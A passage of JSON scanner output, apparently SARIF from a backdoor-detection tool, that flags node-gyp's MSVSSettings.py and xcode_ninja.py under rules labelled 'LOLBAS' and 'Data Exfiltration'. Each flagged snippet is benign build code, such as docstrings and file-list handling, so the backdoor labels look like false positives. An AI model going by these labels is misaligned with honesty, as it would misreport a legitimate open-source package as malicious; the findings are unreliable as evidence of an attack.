                    "text": "\n\ndef ConvertToMSBuildSettings(msvs_settings, stderr=sys.stderr):\n    \"\"\"Converts MSVS settings (VS2008 and earlier) to MSBuild settings (VS2010+).\n\n  Args:\n      msvs_settings: A dictionary.  The key is the tool name.  The values are\n",
                    "rendered": {
                      "text": "\n\ndef ConvertToMSBuildSettings(msvs_settings, stderr=sys.stderr):\n    \"\"\"Converts MSVS settings (VS2008 and earlier) to MSBuild settings (VS2010+).\n\n  Args:\n      msvs_settings: A dictionary.  The key is the tool name.  The values are\n",
                      "markdown": "`\n\ndef ConvertToMSBuildSettings(msvs_settings, stderr=sys.stderr):\n    \"\"\"Converts MSVS settings (VS2008 and earlier) to MSBuild settings (VS2010+).\n\n  Args:\n      msvs_settings: A dictionary.  The key is the tool name.  The values are\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 423,
                  "startColumn": 57,
                  "endLine": 423,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n\ndef ConvertVCMacrosToMSBuild(s):\n    \"\"\"Convert the MSVS macros found in the string to the MSBuild equivalent.\n\n  This list is probably not exhaustive.  Add as needed.\n  \"\"\"\n",
                    "rendered": {
                      "text": "\n\ndef ConvertVCMacrosToMSBuild(s):\n    \"\"\"Convert the MSVS macros found in the string to the MSBuild equivalent.\n\n  This list is probably not exhaustive.  Add as needed.\n  \"\"\"\n",
                      "markdown": "`\n\ndef ConvertVCMacrosToMSBuild(s):\n    \"\"\"Convert the MSVS macros found in the string to the MSBuild equivalent.\n\n  This list is probably not exhaustive.  Add as needed.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 334,
                  "startColumn": 28,
                  "endLine": 334,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_name: the name of the MSVS setting that if 'true' becomes a flag\n    flag: the flag to insert at the end of the AdditionalOptions\n  \"\"\"\n\n    def _Translate(value, msbuild_settings):\n",
                    "rendered": {
                      "text": "  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_name: the name of the MSVS setting that if 'true' becomes a flag\n    flag: the flag to insert at the end of the AdditionalOptions\n  \"\"\"\n\n    def _Translate(value, msbuild_settings):\n",
                      "markdown": "`  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_name: the name of the MSVS setting that if 'true' becomes a flag\n    flag: the flag to insert at the end of the AdditionalOptions\n  \"\"\"\n\n    def _Translate(value, msbuild_settings):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 279,
                  "startColumn": 30,
                  "endLine": 279,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_settings_name: the MSVS name of the setting.\n    msbuild_tool_name: the name of the MSBuild tool to place the setting under.\n    msbuild_settings_name: the MSBuild name of the setting.\n    setting_type: the type of this setting.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_settings_name: the MSVS name of the setting.\n    msbuild_tool_name: the name of the MSBuild tool to place the setting under.\n    msbuild_settings_name: the MSBuild name of the setting.\n    setting_type: the type of this setting.\n  \"\"\"\n\n",
                      "markdown": "`    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_settings_name: the MSVS name of the setting.\n    msbuild_tool_name: the name of the MSBuild tool to place the setting under.\n    msbuild_settings_name: the MSBuild name of the setting.\n    setting_type: the type of this setting.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 278,
                  "startColumn": 38,
                  "endLine": 278,
                  "endColumn": 47,
                  "snippet": {
                    "text": "  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_settings_name: the MSVS name of the setting.\n    msbuild_tool_name: the name of the MSBuild tool to place the setting under.\n    msbuild_settings_name: the MSBuild name of the setting.\n    setting_type: the type of this setting.\n  \"\"\"\n",
                    "rendered": {
                      "text": "  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_settings_name: the MSVS name of the setting.\n    msbuild_tool_name: the name of the MSBuild tool to place the setting under.\n    msbuild_settings_name: the MSBuild name of the setting.\n    setting_type: the type of this setting.\n  \"\"\"\n",
                      "markdown": "`  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_settings_name: the MSVS name of the setting.\n    msbuild_tool_name: the name of the MSBuild tool to place the setting under.\n    msbuild_settings_name: the MSBuild name of the setting.\n    setting_type: the type of this setting.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 33,
                  "endLine": 251,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_name: the name of the MSVS setting.\n    msbuild_name: the name of the MSBuild setting.\n    setting_type: the type of this setting.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_name: the name of the MSVS setting.\n    msbuild_name: the name of the MSBuild setting.\n    setting_type: the type of this setting.\n  \"\"\"\n\n",
                      "markdown": "`  Args:\n    tool: a dictionary that gives the names of the tool for MSVS and MSBuild.\n    msvs_name: the name of the MSVS setting.\n    msbuild_name: the name of the MSBuild setting.\n    setting_type: the type of this setting.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 27,
                  "endLine": 185,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  MSBuild uses text labels that are more representative, like 'Win32'.\n\n  Constructor args:\n    label_list: an array of MSBuild labels that correspond to the MSVS index.\n        In the rare cases where MSVS has skipped an index value, None is\n        used in the array to indicate the unused spot.\n    new: an array of labels that are new to MSBuild.\n",
                    "rendered": {
                      "text": "  MSBuild uses text labels that are more representative, like 'Win32'.\n\n  Constructor args:\n    label_list: an array of MSBuild labels that correspond to the MSVS index.\n        In the rare cases where MSVS has skipped an index value, None is\n        used in the array to indicate the unused spot.\n    new: an array of labels that are new to MSBuild.\n",
                      "markdown": "`  MSBuild uses text labels that are more representative, like 'Win32'.\n\n  Constructor args:\n    label_list: an array of MSBuild labels that correspond to the MSVS index.\n        In the rare cases where MSVS has skipped an index value, None is\n        used in the array to indicate the unused spot.\n    new: an array of labels that are new to MSBuild.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 1,
                  "endLine": 182,
                  "endColumn": 10,
                  "snippet": {
                    "text": "    \"\"\"Type of settings that is an enumeration.\n\n  In MSVS, the values are indexes like '0', '1', and '2'.\n  MSBuild uses text labels that are more representative, like 'Win32'.\n\n  Constructor args:\n    label_list: an array of MSBuild labels that correspond to the MSVS index.\n",
                    "rendered": {
                      "text": "    \"\"\"Type of settings that is an enumeration.\n\n  In MSVS, the values are indexes like '0', '1', and '2'.\n  MSBuild uses text labels that are more representative, like 'Win32'.\n\n  Constructor args:\n    label_list: an array of MSBuild labels that correspond to the MSVS index.\n",
                      "markdown": "`    \"\"\"Type of settings that is an enumeration.\n\n  In MSVS, the values are indexes like '0', '1', and '2'.\n  MSBuild uses text labels that are more representative, like 'Win32'.\n\n  Constructor args:\n    label_list: an array of MSBuild labels that correspond to the MSVS index.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 97,
                  "startColumn": 9,
                  "endLine": 97,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      value: the MSVS value to convert.\n\n    Returns:\n      the MSBuild equivalent.\n\n    Raises:\n      ValueError if value is not valid.\n",
                    "rendered": {
                      "text": "      value: the MSVS value to convert.\n\n    Returns:\n      the MSBuild equivalent.\n\n    Raises:\n      ValueError if value is not valid.\n",
                      "markdown": "`      value: the MSVS value to convert.\n\n    Returns:\n      the MSBuild equivalent.\n\n    Raises:\n      ValueError if value is not valid.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 22,
                  "endLine": 91,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    \"\"\"\n\n    def ConvertToMSBuild(self, value):\n        \"\"\"Returns the MSBuild equivalent of the MSVS value given.\n\n    Args:\n      value: the MSVS value to convert.\n",
                    "rendered": {
                      "text": "    \"\"\"\n\n    def ConvertToMSBuild(self, value):\n        \"\"\"Returns the MSBuild equivalent of the MSVS value given.\n\n    Args:\n      value: the MSVS value to convert.\n",
                      "markdown": "`    \"\"\"\n\n    def ConvertToMSBuild(self, value):\n        \"\"\"Returns the MSBuild equivalent of the MSVS value given.\n\n    Args:\n      value: the MSVS value to convert.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 17,
                  "endLine": 63,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n\ndef _GetMSBuildToolSettings(msbuild_settings, tool):\n    \"\"\"Returns an MSBuild tool dictionary.  Creates it if needed.\"\"\"\n    return msbuild_settings.setdefault(tool.msbuild_name, {})\n\n\n",
                    "rendered": {
                      "text": "\n\ndef _GetMSBuildToolSettings(msbuild_settings, tool):\n    \"\"\"Returns an MSBuild tool dictionary.  Creates it if needed.\"\"\"\n    return msbuild_settings.setdefault(tool.msbuild_name, {})\n\n\n",
                      "markdown": "`\n\ndef _GetMSBuildToolSettings(msbuild_settings, tool):\n    \"\"\"Returns an MSBuild tool dictionary.  Creates it if needed.\"\"\"\n    return msbuild_settings.setdefault(tool.msbuild_name, {})\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 74,
                  "endLine": 14,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\nThis file was created by comparing the projects created by Visual Studio 2008\nand Visual Studio 2010 for all available settings through the user interface.\nThe MSBuild schemas were also considered.  They are typically found in the\nMSBuild install directory, e.g. c:\\Program Files (x86)\\MSBuild\n\"\"\"\n\nimport re\n",
                    "rendered": {
                      "text": "\nThis file was created by comparing the projects created by Visual Studio 2008\nand Visual Studio 2010 for all available settings through the user interface.\nThe MSBuild schemas were also considered.  They are typically found in the\nMSBuild install directory, e.g. c:\\Program Files (x86)\\MSBuild\n\"\"\"\n\nimport re\n",
                      "markdown": "`\nThis file was created by comparing the projects created by Visual Studio 2008\nand Visual Studio 2010 for all available settings through the user interface.\nThe MSBuild schemas were also considered.  They are typically found in the\nMSBuild install directory, e.g. c:\\Program Files (x86)\\MSBuild\n\"\"\"\n\nimport re\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 3,
                  "endLine": 13,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\nThis file was created by comparing the projects created by Visual Studio 2008\nand Visual Studio 2010 for all available settings through the user interface.\nThe MSBuild schemas were also considered.  They are typically found in the\nMSBuild install directory, e.g. c:\\Program Files (x86)\\MSBuild\n\"\"\"\n\n",
                    "rendered": {
                      "text": "\nThis file was created by comparing the projects created by Visual Studio 2008\nand Visual Studio 2010 for all available settings through the user interface.\nThe MSBuild schemas were also considered.  They are typically found in the\nMSBuild install directory, e.g. c:\\Program Files (x86)\\MSBuild\n\"\"\"\n\n",
                      "markdown": "`\nThis file was created by comparing the projects created by Visual Studio 2008\nand Visual Studio 2010 for all available settings through the user interface.\nThe MSBuild schemas were also considered.  They are typically found in the\nMSBuild install directory, e.g. c:\\Program Files (x86)\\MSBuild\n\"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 880,
                  "startColumn": 17,
                  "endLine": 880,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        \"Windows\",  # /SUBSYSTEM:WINDOWS\n        \"Native\",  # /SUBSYSTEM:NATIVE\n        \"EFI Application\",  # /SUBSYSTEM:EFI_APPLICATION\n        \"EFI Boot Service Driver\",  # /SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER\n        \"EFI ROM\",  # /SUBSYSTEM:EFI_ROM\n        \"EFI Runtime\",  # /SUBSYSTEM:EFI_RUNTIME_DRIVER\n        \"WindowsCE\",\n",
                    "rendered": {
                      "text": "        \"Windows\",  # /SUBSYSTEM:WINDOWS\n        \"Native\",  # /SUBSYSTEM:NATIVE\n        \"EFI Application\",  # /SUBSYSTEM:EFI_APPLICATION\n        \"EFI Boot Service Driver\",  # /SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER\n        \"EFI ROM\",  # /SUBSYSTEM:EFI_ROM\n        \"EFI Runtime\",  # /SUBSYSTEM:EFI_RUNTIME_DRIVER\n        \"WindowsCE\",\n",
                      "markdown": "`        \"Windows\",  # /SUBSYSTEM:WINDOWS\n        \"Native\",  # /SUBSYSTEM:NATIVE\n        \"EFI Application\",  # /SUBSYSTEM:EFI_APPLICATION\n        \"EFI Boot Service Driver\",  # /SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER\n        \"EFI ROM\",  # /SUBSYSTEM:EFI_ROM\n        \"EFI Runtime\",  # /SUBSYSTEM:EFI_RUNTIME_DRIVER\n        \"WindowsCE\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 21,
                  "endLine": 60,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\ndef _TargetFromSpec(old_spec, params):\n    \"\"\" Create fake target for xcode-ninja wrapper. \"\"\"\n    # Determine ninja top level build dir (e.g. /path/to/out).\n    ninja_toplevel = None\n    jobs = 0\n    if params:\n",
                    "rendered": {
                      "text": "\ndef _TargetFromSpec(old_spec, params):\n    \"\"\" Create fake target for xcode-ninja wrapper. \"\"\"\n    # Determine ninja top level build dir (e.g. /path/to/out).\n    ninja_toplevel = None\n    jobs = 0\n    if params:\n",
                      "markdown": "`\ndef _TargetFromSpec(old_spec, params):\n    \"\"\" Create fake target for xcode-ninja wrapper. \"\"\"\n    # Determine ninja top level build dir (e.g. /path/to/out).\n    ninja_toplevel = None\n    jobs = 0\n    if params:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 60,
                  "endLine": 297,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    new_data[sources_gyp] = {}\n    new_data[sources_gyp][\"targets\"] = []\n    new_data[sources_gyp][\"included_files\"] = []\n    new_data[sources_gyp][\"xcode_settings\"] = data[orig_gyp].get(\"xcode_settings\", {})\n    new_data[sources_gyp][\"targets\"].append(new_data_target)\n\n    # Write workspace to file.\n",
                    "rendered": {
                      "text": "    new_data[sources_gyp] = {}\n    new_data[sources_gyp][\"targets\"] = []\n    new_data[sources_gyp][\"included_files\"] = []\n    new_data[sources_gyp][\"xcode_settings\"] = data[orig_gyp].get(\"xcode_settings\", {})\n    new_data[sources_gyp][\"targets\"].append(new_data_target)\n\n    # Write workspace to file.\n",
                      "markdown": "`    new_data[sources_gyp] = {}\n    new_data[sources_gyp][\"targets\"] = []\n    new_data[sources_gyp][\"included_files\"] = []\n    new_data[sources_gyp][\"xcode_settings\"] = data[orig_gyp].get(\"xcode_settings\", {})\n    new_data[sources_gyp][\"targets\"].append(new_data_target)\n\n    # Write workspace to file.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 35,
                  "endLine": 269,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n                files.extend(action.get(\"inputs_excluded\", []))\n\n        # Remove files starting with $. These are mostly intermediate files for the\n        # build system.\n",
                    "rendered": {
                      "text": "            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n                files.extend(action.get(\"inputs_excluded\", []))\n\n        # Remove files starting with $. These are mostly intermediate files for the\n        # build system.\n",
                      "markdown": "`            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n                files.extend(action.get(\"inputs_excluded\", []))\n\n        # Remove files starting with $. These are mostly intermediate files for the\n        # build system.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 31,
                  "endLine": 266,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            )\n\n        for action in target_dict.get(\"actions\", []):\n            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n                files.extend(action.get(\"inputs_excluded\", []))\n",
                    "rendered": {
                      "text": "            )\n\n        for action in target_dict.get(\"actions\", []):\n            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n                files.extend(action.get(\"inputs_excluded\", []))\n",
                      "markdown": "`            )\n\n        for action in target_dict.get(\"actions\", []):\n            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n                files.extend(action.get(\"inputs_excluded\", []))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 265,
                  "startColumn": 33,
                  "endLine": 265,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n        for action in target_dict.get(\"actions\", []):\n            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n",
                    "rendered": {
                      "text": "                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n        for action in target_dict.get(\"actions\", []):\n            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n",
                      "markdown": "`                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n        for action in target_dict.get(\"actions\", []):\n            files.extend(action.get(\"inputs\", []))\n\n            if not skip_excluded_files:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 262,
                  "startColumn": 29,
                  "endLine": 262,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        if not skip_excluded_files:\n            files.extend(\n                target_dict.get(\"sources_excluded\", [])\n                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n        for action in target_dict.get(\"actions\", []):\n",
                    "rendered": {
                      "text": "        if not skip_excluded_files:\n            files.extend(\n                target_dict.get(\"sources_excluded\", [])\n                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n        for action in target_dict.get(\"actions\", []):\n",
                      "markdown": "`        if not skip_excluded_files:\n            files.extend(\n                target_dict.get(\"sources_excluded\", [])\n                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n        for action in target_dict.get(\"actions\", []):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 261,
                  "startColumn": 27,
                  "endLine": 261,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n        if not skip_excluded_files:\n            files.extend(\n                target_dict.get(\"sources_excluded\", [])\n                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n",
                    "rendered": {
                      "text": "\n        if not skip_excluded_files:\n            files.extend(\n                target_dict.get(\"sources_excluded\", [])\n                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n",
                      "markdown": "`\n        if not skip_excluded_files:\n            files.extend(\n                target_dict.get(\"sources_excluded\", [])\n                + target_dict.get(\"mac_bundle_resources_excluded\", [])\n            )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 255,
                  "startColumn": 60,
                  "endLine": 255,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    sources = []\n    for target, target_dict in target_dicts.items():\n        base = os.path.dirname(target)\n        files = target_dict.get(\"sources\", []) + target_dict.get(\n            \"mac_bundle_resources\", []\n        )\n\n",
                    "rendered": {
                      "text": "    sources = []\n    for target, target_dict in target_dicts.items():\n        base = os.path.dirname(target)\n        files = target_dict.get(\"sources\", []) + target_dict.get(\n            \"mac_bundle_resources\", []\n        )\n\n",
                      "markdown": "`    sources = []\n    for target, target_dict in target_dicts.items():\n        base = os.path.dirname(target)\n        files = target_dict.get(\"sources\", []) + target_dict.get(\n            \"mac_bundle_resources\", []\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 255,
                  "startColumn": 27,
